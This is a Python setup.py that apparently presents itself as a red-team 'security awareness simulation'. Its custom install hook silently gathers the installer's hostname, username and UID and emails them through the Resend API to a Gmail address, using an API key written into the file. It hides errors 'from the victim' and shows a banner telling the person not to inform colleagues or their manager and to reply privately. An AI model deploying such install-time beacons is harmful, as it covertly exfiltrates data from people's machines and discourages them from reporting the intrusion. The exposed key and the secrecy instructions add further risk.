"""
setup.py — exists solely to inject the simulation post-install hook.
All real project metadata lives in pyproject.toml.
"""
import os
import tempfile

from setuptools import setup
from setuptools.command.install import install

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURE BEFORE DEPLOYING
#   1. Sign up free at https://resend.com → API Keys → Create Key → paste below
#   2. Add your sending domain at resend.com/domains (add one DNS TXT record)
# ─────────────────────────────────────────────────────────────────────────────
RESEND_API_KEY = "re_XeAmoAKv_EbZKR2jtt9G6nRtvYJ8CBU3d"
FROM_EMAIL     = "onboarding@resend.dev"
ALERT_TO       = "tradealertsrealtime@gmail.com"
# ─────────────────────────────────────────────────────────────────────────────

_SENTINEL = os.path.join(tempfile.gettempdir(), ".skills_scanner_sim_ran")

_BANNER = """\033[1;33m
╔══════════════════════════════════════════════════════════════════════════════╗
║       ⚠️   SECURITY AWARENESS SIMULATION — SoFi Red Team   ⚠️               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  This was a CONTROLLED adversarial simulation. No real harm was done.       ║
║                                                                              ║
║  What just happened:                                                         ║
║    • You installed a package from an unverified GitHub repository.           ║
║    • Its install hook silently collected your hostname and user ID,          ║
║      then sent them to the simulation operator.                              ║
║                                                                              ║
║  In a real supply-chain attack this hook could have:                         ║
║    • Stolen credentials, SSH keys, or AWS tokens                             ║
║    • Installed persistent backdoors or keyloggers                            ║
║    • Pivoted to internal services reachable from your machine                ║
║                                                                              ║
║  What to do next:                                                            ║
║    1. Stop. Do not discuss this with colleagues, teammates, or your          ║
║       manager — doing so would compromise the simulation and skew            ║
║       results for others still being tested.                                 ║
║    2. Contact sjayashankar@sofi.org to acknowledge you received this.        ║
║    3. Never install packages from unreviewed external repos without          ║
║       approval from your AppSec / Offisec team.                             ║
║                                                                              ║
║  Questions? Contact: sjayashankar@sofi.org (privately)                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
\033[0m"""


def _send_alert():
    if os.path.exists(_SENTINEL):
        return
    try:
        open(_SENTINEL, "w").close()
    except Exception:
        pass

    try:
        import socket
        import json
        import urllib.request

        hostname = socket.gethostname()
        username = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"
        uid      = str(os.getuid()) if hasattr(os, "getuid") else "n/a"

        body = (
            "Security Simulation — Install Beacon\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Hostname : {hostname}\n"
            f"Username : {username}\n"
            f"UID      : {uid}\n"
        )

        payload = json.dumps({
            "from":    FROM_EMAIL,
            "to":      [ALERT_TO],
            "subject": "[Red Team Sim] Install beacon received",
            "text":    body,
        }).encode()

        req = urllib.request.Request(
            "https://api.resend.com/emails",
            data    = payload,
            headers = {
                "Authorization": f"Bearer {RESEND_API_KEY}",
                "Content-Type":  "application/json",
                "User-Agent":    "Mozilla/5.0",
            },
        )
        urllib.request.urlopen(req, timeout=10)

    except Exception:
        pass  # never surface errors to the victim

    try:
        with open("/dev/tty", "w") as tty:
            tty.write(_BANNER + "\n")
    except Exception:
        import sys
        sys.stderr.write(_BANNER + "\n")


class HookedInstall(install):
    def run(self):
        super().run()
        _send_alert()


setup(
    cmdclass={
        "install": HookedInstall,
    }
)
